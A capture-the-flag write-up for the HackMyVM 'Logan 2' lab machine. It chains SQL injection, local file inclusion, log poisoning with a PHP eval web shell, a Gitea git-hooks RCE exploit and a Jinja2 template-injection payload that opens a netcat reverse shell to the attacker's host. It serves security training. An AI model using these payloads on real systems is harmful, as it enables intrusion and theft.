# Logan 2

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.160:22
Open 10.0.2.160:80
Open 10.0.2.160:3000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.160
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 10:ed:dd:ab:26:fd:f4:9f:28:1e:89:93:f4:58:16:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDnjhFrlAMi06UbJbqL8vCRNan3Azij63mLg/jbysc+PqRxSiiCv1/imcjikQLi5SnnyY//gRLa0EJz1D7kLWqk=
|   256 43:3b:d9:8c:12:44:e9:92:be:cf:1a:78:fd:33:38:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIIyIpQI1VgDg/IXP7Y+NR/aiAmqxd5KGk/ZQ8fL77eu
80/tcp   open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-title: Logan
|_http-server-header: Apache/2.4.57 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
3000/tcp open  http    syn-ack Golang net/http server
| http-methods: 
|_  Supported Methods: GET HEAD
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=03b5a6f340975660; Path=/; HttpOnly
|     Set-Cookie: _csrf=K-lLM6JZGsKdEKrRUYfG-wn7v106MTc2NjUyNDY5ODA3NzAzMDgwNg; Path=/; Expires=Wed, 24 Dec 2025 21:18:18 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 23 Dec 2025 21:18:18 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=dd155cfb485859c1; Path=/; HttpOnly
|     Set-Cookie: _csrf=aMQhitjP2RXvTzhFAsQ81zz_TGo6MTc2NjUyNDY5ODMzMzUyNDYzNw; Path=/; Expires=Wed, 24 Dec 2025 21:18:18 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 23 Dec 2025 21:18:18 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a c
|_http-favicon: Unknown favicon MD5: 1DA00ABAD6446BA9C8E80B5C948B4D83
|_http-title:  Gitea: Git with a cup of tea 
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

```bash
└─$ curl http://10.0.2.160/
<!DOCTYPE html>
<html>
<head>
    <title>Logan</title>
    <script src="script.js"></script>
</head>
<body>
    <h1>Welcome!!!</h1>
</body>
</html>

└─$ curl http://10.0.2.160/script.js
document.addEventListener("DOMContentLoaded", function() {
    fetch('/save-user-agent.php', {
        method: 'POST',
        body: JSON.stringify({ user_agent: navigator.userAgent }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => {
        if (response.ok) {
            console.log('User-Agent saved successfully.');
        } else {
            console.error('Error saving User-Agent.');
        }
    })
    .catch(error => {
        console.error('Network error:', error);
    });
});
```

Looks like SQL injectable (500 error from `'`)
```bash
└─$ curl http://10.0.2.160/save-user-agent.php --json '{"user_agent":"letmein"}' -i
HTTP/1.1 200 OK
Date: Tue, 23 Dec 2025 21:27:03 GMT
Server: Apache/2.4.57 (Debian)
Content-Length: 0
Content-Type: text/html; charset=UTF-8

└─$ curl http://10.0.2.160/save-user-agent.php --json $'{"user_agent":"letmein\'"}' -i
HTTP/1.0 500 Internal Server Error
Date: Tue, 23 Dec 2025 21:27:14 GMT
Server: Apache/2.4.57 (Debian)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

### SQLi

Save request
```bash
└─$ curl http://10.0.2.160/save-user-agent.php --json '{"user_agent":"letmein"}' -s --trace-ascii - | grep upload -B100 | grep -E '^[0-9a-f]{4}:' | sed 's/^[0-9a-f]\{4\}: //' | tee reqeuest
.txt
POST /save-user-agent.php HTTP/1.1
Host: 10.0.2.160
User-Agent: curl/8.17.0
Content-Type: application/json
Accept: application/json
Content-Length: 24

{"user_agent":"letmein"}
```

```bash
└─$ sqlmap -r reqeuest.txt --batch --dbms=MySQL --technique=ET --current-db
---
Parameter: JSON user_agent ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"user_agent":"letmein' AND (SELECT 2782 FROM (SELECT(SLEEP(5)))SboW) AND 'THKs'='THKs"}
---
current database: 'logan'
```

```bash
└─$ sqlmap -r reqeuest.txt --batch --dbms=MySQL --technique=ET -D logan --tables
Database: logan
[3 tables]
+----------+
| browser  |
| comments |
| users    |
+----------+
```

```bash
Database: logan
Table: users
[1 entry]
+------------------------------+--------+
| email                        | user   |
+------------------------------+--------+
| logan@newsitelogan.logan.hmv | logan  |
+------------------------------+--------+
```

![writeup.png](/assets/pentest/hackmyvm/logan2/writeup.png)

Comments leak PHP file
```bash
└─$ curl http://newsitelogan.logan.hmv/ -s | grep '<!--'
<!-- THE OLD WEBSITE WAS VERY UGLY LUCKILY WE HIRED NEW DESIGNERS -->
            <!-- <img class="space-image" src="/photos-website-logan.php?photo=moon.png"> -->
            <!-- <img class="space-image" src="/photos-website-logan.php?photo=mars.jpg"> -->
            <!-- <img class="space-image" src="/photos-website-logan.php?photo=pleyades.jpg"> -->
```

### LFI

```bash
└─$ curl -s 'http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../etc/passwd' | grep sh$
root:x:0:0:root:/root:/bin/bash
logan:x:1000:1000:logan,,,:/home/logan:/bin/bash
git:x:104:113:Git Version Control,,,:/home/git:/bin/bash
kevin:x:1001:1001:kevin,,,:/home/kevin:/bin/bash
```

### RCE

Log files are readable
```bash
└─$ curl -s 'http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../var/log/apache2/access.log'
Logs are cleaned every minut
10.0.2.149 - - [23/Dec/2025:15:54:00 -0600] "POST /save-user-agent.php HTTP/1.1" 500 185 "-" "curl/8.17.0"
10.0.2.149 - - [23/Dec/2025:15:54:01 -0600] "POST /save-user-agent.php HTTP/1.1" 500 185 "-" "curl/8.17.0"
```

```bash
└─$ curl -s 'http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../var/log/apache2/access.log' -A '<?php echo phpinfo(); ?>'
└─$ curl -s 'http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../var/log/apache2/access.log' | grep disable_functions | html2markdown
disable_functions| system, exec, shell_exec, passthru, proc_open, popen,
psockopen, stream_socket_client| system, exec, shell_exec, passthru,
proc_open, popen, psockopen, stream_socket_client
```

We can still use `eval` and write PHP code
```bash
└─$ curl -s 'http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../var/log/apache2/access.log' -A '<?php echo @eval(@$_REQUEST[0]); ?>'
---
└─$ curl -s 'http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../var/log/apache2/access.log' -G --data-urlencode '0=print_r(scandir("/var/www/logan"));'
(
    [0] => .
    [1] => ..
    [2] => comments.php
    [3] => config.php
    [4] => images
    [5] => index.php
    [6] => photos-website-logan.php
)
└─$ curl -s 'http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../var/log/apache2/access.log' -G --data-urlencode '0=show_source("/var/www/logan/config.php");' > index.html
```

![writeup-1.png](/assets/pentest/hackmyvm/logan2/writeup-1.png)

## Gitea (3000)

::: info Note
`logan:Super_logan1234`
:::

![writeup-2.png](/assets/pentest/hackmyvm/logan2/writeup-2.png)

The app he's building has SSTI vulnerability, but we can't interact with the application.

![writeup-3.png](/assets/pentest/hackmyvm/logan2/writeup-3.png)

```bash
└─$ searchsploit 'Gitea'
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Gitea 1.12.5 - Remote Code Execution (Authenticated)        | multiple/webapps/49571.py
Gitea 1.16.6 - Remote Code Execution (RCE) (Metasploit)     | multiple/webapps/51009.rb
```

- **[CVE-2020-14144-GiTea-git-hooks-rce](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce)
- [Gitea 1.12.5 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49571)

No shell
```bash
└─$ curl -LOs https://raw.githubusercontent.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce/refs/heads/main/CVE-2020-14144-GiTea-git-hooks-rce.py

└─$ py CVE-2020-14144-GiTea-git-hooks-rce.py -t http://logan.hmv:3000 -u logan -p Super_logan1234 -I 10.0.2.149 -P 4444
[+] Exploit completed !
```

For POC to work uncomment the `g.repo_delete(reponame)` call, then go to directory and `git push` yourself because POC fails and catch a shell.

```bash
└─$ penelope -p 4444
git@logan2:~/gitea-repositories/logan/vuln.git$ id
uid=104(git) gid=113(git) groups=113(git)
```

## Privilege Escalation

```bash
git@logan2:~$ sudo -l
Matching Defaults entries for git on logan2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User git may run the following commands on logan2:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
```

```bash
git@logan2:~$ sudo /usr/bin/python3 /opt/app.py
```

- [https://blog.1nf1n1ty.team/hacktricks/pentesting-web/ssti-server-side-template-injection#jinja2-python](https://blog.1nf1n1ty.team/hacktricks/pentesting-web/ssti-server-side-template-injection#jinja2-python)

```bash
└─$ curl http://10.0.2.160:8000/test -G --data-urlencode 'name={{ cycler.__init__.__globals__.os.popen("busybox nc 10.0.2.149 4444 -e /bin/bash").read() }}'
```

## Flags

```bash
root@logan2:/home/git# cat /home/logan/user.txt
User Flag: 24671329416324134234

root@logan2:/home/git# cat /root/root.txt
Root flag: 1290381293128301a
```